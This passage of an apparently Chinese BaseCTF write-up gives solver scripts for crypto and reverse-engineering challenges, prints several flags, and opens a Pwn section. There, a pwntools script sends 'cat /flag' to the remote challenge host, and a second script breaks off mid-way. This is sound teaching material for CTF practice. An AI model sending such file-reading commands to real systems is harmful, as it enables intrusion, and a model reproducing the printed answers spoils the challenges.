</span></span><span style=display:flex><span>        <span style=color:#ae81ff>165</span>, <span style=color:#ae81ff>146</span>, <span style=color:#ae81ff>79</span>, <span style=color:#ae81ff>115</span>, <span style=color:#ae81ff>146</span>, <span style=color:#ae81ff>233</span>, <span style=color:#ae81ff>112</span>, <span style=color:#ae81ff>180</span>, <span style=color:#ae81ff>48</span>, <span style=color:#ae81ff>79</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>65</span>, <span style=color:#ae81ff>181</span>, <span style=color:#ae81ff>113</span>, <span style=color:#ae81ff>146</span>, <span style=color:#ae81ff>46</span>, <span style=color:#ae81ff>249</span>, <span style=color:#ae81ff>78</span>, <span style=color:#ae81ff>183</span>, <span style=color:#ae81ff>79</span>, <span style=color:#ae81ff>133</span>,
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>180</span>, <span style=color:#ae81ff>113</span>, <span style=color:#ae81ff>146</span>, <span style=color:#ae81ff>148</span>, <span style=color:#ae81ff>163</span>, <span style=color:#ae81ff>79</span>, <span style=color:#ae81ff>78</span>, <span style=color:#ae81ff>48</span>, <span style=color:#ae81ff>231</span>, <span style=color:#ae81ff>77</span>
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> flag[<span style=color:#ae81ff>40</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>char</span> inverse <span style=color:#f92672>=</span> <span style=color:#ae81ff>241</span>;  <span style=color:#75715e>// 17&#39;s modular inverse modulo 256
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>40</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        flag[i] <span style=color:#f92672>=</span> (cipher[i] <span style=color:#f92672>*</span> inverse) <span style=color:#f92672>%</span> <span style=color:#ae81ff>256</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Print the decrypted flag
</span></span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Decrypted flag: &#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>40</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;%c&#34;</span>, flag[i]);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h3 id=babypack>babypack</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 从文件中读取a和c的值</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;D:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>谷歌</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>babypack</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>output.txt&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>    lines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
</span></span><span style=display:flex><span>    a <span style=color:#f92672>=</span> eval(lines[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;=&#39;</span>)[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> int(lines[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>strip()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;=&#39;</span>)[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>bin_m <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(a)):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> c <span style=color:#f92672>&gt;=</span> a[i]:
</span></span><span style=display:flex><span>        bin_m<span style=color:#f92672>.</span>append(<span style=color:#e6db74>&#39;1&#39;</span>)
</span></span><span style=display:flex><span>        c <span style=color:#f92672>-=</span> a[i]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        bin_m<span style=color:#f92672>.</span>append(<span style=color:#e6db74>&#39;0&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 将bin_m转换回整数m</span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> int(<span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(bin_m), <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 将m转换回flag</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>print(flag)
</span></span></code></pre></div><h2 id=re>Re</h2><h3 id=you-are-good-at-ida>You are good at IDA</h3><p>按照shift和f12进行查找最后拼接就行了</p><p><strong>BaseCTF{Y0u_4Re_900d_47_id4}</strong></p><h3 id=upx-mini>UPX mini</h3><p>QmFzZUNURntIYXYzX0BfZzBvZF90MW0zISEhfQ==</p><p>base64解密</p><p><strong>BaseCTF{Hav3_@_g0od_t1m3!!!}</strong></p><h3 id=ez_maze>ez_maze</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> collections <span style=color:#f92672>import</span> deque
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>find_path</span>(maze, start_pos, end_pos):
</span></span><span style=display:flex><span>    ROWS <span style=color:#f92672>=</span> len(maze)
</span></span><span style=display:flex><span>    COLS <span style=color:#f92672>=</span> len(maze[<span style=color:#ae81ff>0</span>])
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>move</span>(pos, direction):
</span></span><span style=display:flex><span>        x, y <span style=color:#f92672>=</span> divmod(pos, COLS)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> direction <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;d&#39;</span>:  <span style=color:#75715e># Right</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> pos <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> direction <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;s&#39;</span>:  <span style=color:#75715e># Down</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> pos <span style=color:#f92672>+</span> COLS
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> direction <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;w&#39;</span>:  <span style=color:#75715e># Up</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> pos <span style=color:#f92672>-</span> COLS
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> direction <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;a&#39;</span>:  <span style=color:#75715e># Left</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> pos <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> pos
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>is_valid</span>(pos):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> pos <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>or</span> pos <span style=color:#f92672>&gt;=</span> ROWS <span style=color:#f92672>*</span> COLS:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>        x, y <span style=color:#f92672>=</span> divmod(pos, COLS)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> maze[x][y] <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;$&#39;</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    queue <span style=color:#f92672>=</span> deque([(start_pos, <span style=color:#e6db74>&#39;&#39;</span>)])
</span></span><span style=display:flex><span>    visited <span style=color:#f92672>=</span> set()
</span></span><span style=display:flex><span>    visited<span style=color:#f92672>.</span>add(start_pos)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> queue:
</span></span><span style=display:flex><span>        current_pos, path <span style=color:#f92672>=</span> queue<span style=color:#f92672>.</span>popleft()
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> current_pos <span style=color:#f92672>==</span> end_pos:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> path
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> direction <span style=color:#f92672>in</span> <span style=color:#e6db74>&#39;dsaw&#39;</span>:
</span></span><span style=display:flex><span>            new_pos <span style=color:#f92672>=</span> move(current_pos, direction)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> is_valid(new_pos) <span style=color:#f92672>and</span> new_pos <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> visited:
</span></span><span style=display:flex><span>                visited<span style=color:#f92672>.</span>add(new_pos)
</span></span><span style=display:flex><span>                queue<span style=color:#f92672>.</span>append((new_pos, path <span style=color:#f92672>+</span> direction))
</span></span><span style=display:flex><span>                
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 迷宫初始化</span>
</span></span><span style=display:flex><span>maze <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;x$$$$$$$$$$$$$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;$$$$$$&amp;$$$$$$$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;$$$$$$$$$&amp;$$&amp;$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;$$$$$$$$$&amp;$&amp;$$$&#34;</span>,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y&#34;</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 将迷宫数据转换为一维列表</span>
</span></span><span style=display:flex><span>ROWS <span style=color:#f92672>=</span> <span style=color:#ae81ff>15</span>
</span></span><span style=display:flex><span>COLS <span style=color:#f92672>=</span> <span style=color:#ae81ff>15</span>
</span></span><span style=display:flex><span>maze_1d <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(maze)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 起点和终点</span>
</span></span><span style=display:flex><span>START <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>END <span style=color:#f92672>=</span> (ROWS <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> COLS <span style=color:#f92672>+</span> (COLS <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)  <span style=color:#75715e># 最后一行最后一列的位置</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 查找路径</span>
</span></span><span style=display:flex><span>path <span style=color:#f92672>=</span> find_path([maze_1d[i <span style=color:#f92672>*</span> COLS:(i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> COLS] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(ROWS)], START, END)
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> path:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;找到的路径：</span><span style=color:#e6db74>{</span>path<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;没有找到路径&#34;</span>)
</span></span></code></pre></div><p>最后进行MD5加密就行</p><h3 id=baseplus>BasePlus</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Secret array used in encoding</span>
</span></span><span style=display:flex><span>Secret <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/128GhIoPQROSTeUbADfgHijKLM+n0pFWXY456xyzB7=39VaqrstJklmNuZvwcdEC&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decode</span>(encoded_str):
</span></span><span style=display:flex><span>    decoded_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Step 1: XOR each character with 0xE to undo the XOR applied during encoding</span>
</span></span><span style=display:flex><span>    xor_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join(chr(ord(char) <span style=color:#f92672>^</span> <span style=color:#ae81ff>0xE</span>) <span style=color:#66d9ef>for</span> char <span style=color:#f92672>in</span> encoded_str)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># Process the string in chunks of 4 characters</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(xor_str), <span style=color:#ae81ff>4</span>):
</span></span><span style=display:flex><span>        enc_chunk <span style=color:#f92672>=</span> xor_str[i:i<span style=color:#f92672>+</span><span style=color:#ae81ff>4</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>            <span style=color:#75715e># Reverse the Base64-like encoding using the Secret array</span>
</span></span><span style=display:flex><span>            v15 <span style=color:#f92672>=</span> (Secret<span style=color:#f92672>.</span>index(enc_chunk[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>2</span>) <span style=color:#f92672>|</span> (Secret<span style=color:#f92672>.</span>index(enc_chunk[<span style=color:#ae81ff>1</span>]) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>4</span>)
</span></span><span style=display:flex><span>            v16 <span style=color:#f92672>=</span> ((Secret<span style=color:#f92672>.</span>index(enc_chunk[<span style=color:#ae81ff>1</span>]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xF</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>|</span> (Secret<span style=color:#f92672>.</span>index(enc_chunk[<span style=color:#ae81ff>2</span>]) <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>            v17 <span style=color:#f92672>=</span> ((Secret<span style=color:#f92672>.</span>index(enc_chunk[<span style=color:#ae81ff>2</span>]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0x3</span>) <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>6</span>) <span style=color:#f92672>|</span> Secret<span style=color:#f92672>.</span>index(enc_chunk[<span style=color:#ae81ff>3</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e># Reconstruct the original characters</span>
</span></span><span style=display:flex><span>            decoded_str <span style=color:#f92672>+=</span> chr(v15)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> v16 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>                decoded_str <span style=color:#f92672>+=</span> chr(v16)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> v17 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>                decoded_str <span style=color:#f92672>+=</span> chr(v17)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>ValueError</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error processing chunk: </span><span style=color:#e6db74>{</span>enc_chunk<span style=color:#e6db74>}</span><span style=color:#e6db74> - </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> decoded_str
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Example usage</span>
</span></span><span style=display:flex><span>encoded_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;lvfzBiZiOw7&lt;lhF8dDOfEbmI]i@bdcZfEc^z&gt;aD!&#34;</span>
</span></span><span style=display:flex><span>decoded_str <span style=color:#f92672>=</span> decode(encoded_str)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> decoded_str <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Decoded string: </span><span style=color:#e6db74>{</span>decoded_str<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Decoding failed due to an error.&#34;</span>)
</span></span></code></pre></div><h3 id=ez-xor>Ez Xor</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> struct
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>key_stream</span>(key, length):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;生成与输入数据长度相同的key stream&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bytes([i <span style=color:#f92672>^</span> key[i <span style=color:#f92672>%</span> len(key)] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(length)])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt_decrypt</span>(data, key_stream):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;对数据进行加密/解密操作&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> bytes([data[i] <span style=color:#f92672>^</span> key_stream[len(data) <span style=color:#f92672>-</span> i <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>] <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(data))])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>attempt_decryption</span>(encrypted_data, key):
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;尝试用给定的key解密数据&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    key_stream_data <span style=color:#f92672>=</span> key_stream(key, len(encrypted_data))
</span></span><span style=display:flex><span>    decrypted <span style=color:#f92672>=</span> encrypt_decrypt(encrypted_data, key_stream_data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        flag <span style=color:#f92672>=</span> decrypted<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> flag<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;Base&#34;</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> flag, <span style=color:#e6db74>&#34;可能的flag&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> flag, <span style=color:#e6db74>&#34;解密结果&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>UnicodeDecodeError</span>:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> decrypted<span style=color:#f92672>.</span>hex(), <span style=color:#e6db74>&#34;无法解码为ASCII，十六进制结果&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    encrypted_flag <span style=color:#f92672>=</span> (
</span></span><span style=display:flex><span>        <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x01\x09\x05\x25\x26\x2D\x0B\x1D</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x24\x7A\x31\x20\x1E\x49\x3D\x67</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x4D\x50\x08\x25\x2E\x6E\x05\x34</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x22\x40\x3B\x25</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>    )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    key_value <span style=color:#f92672>=</span> <span style=color:#ae81ff>7499608</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 定义不同格式的key</span>
</span></span><span style=display:flex><span>    keys <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>        struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&lt;I&#39;</span>, key_value),      <span style=color:#75715e># 小端 32 位</span>
</span></span><span style=display:flex><span>        struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;I&#39;</span>, key_value),      <span style=color:#75715e># 大端 32 位</span>
</span></span><span style=display:flex><span>        struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&lt;I&#39;</span>, key_value)[:<span style=color:#ae81ff>3</span>],  <span style=color:#75715e># 小端 24 位</span>
</span></span><span style=display:flex><span>        struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;I&#39;</span>, key_value)[<span style=color:#ae81ff>1</span>:],  <span style=color:#75715e># 大端 24 位</span>
</span></span><span style=display:flex><span>    ]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i, key <span style=color:#f92672>in</span> enumerate(keys):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>尝试 key </span><span style=color:#e6db74>{</span>i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span><span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>key<span style=color:#f92672>.</span>hex()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        result, status <span style=color:#f92672>=</span> attempt_decryption(encrypted_flag, key)
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>status<span style=color:#e6db74>}</span><span style=color:#e6db74>: </span><span style=color:#e6db74>{</span>result<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><h2 id=pwn>Pwn</h2><h3 id=签个到吧>签个到吧</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 设置连接信息</span>
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;challenge.basectf.fun&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> <span style=color:#ae81ff>33292</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 连接到远程服务</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(host, port)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 发送和接收数据</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;cat /flag&#39;</span>)
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> p<span style=color:#f92672>.</span>recvline()
</span></span><span style=display:flex><span>print(response<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 继续其他的交互操作</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 关闭连接</span>
</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>close()
</span></span></code></pre></div><h3 id=echo>echo</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 设置连接信息</span>
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;challenge.basectf.fun&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> <span style=color:#ae81ff>40511</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 连接到远程服务</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> remote(host, port)
</span></span><span style=display:flex><span>
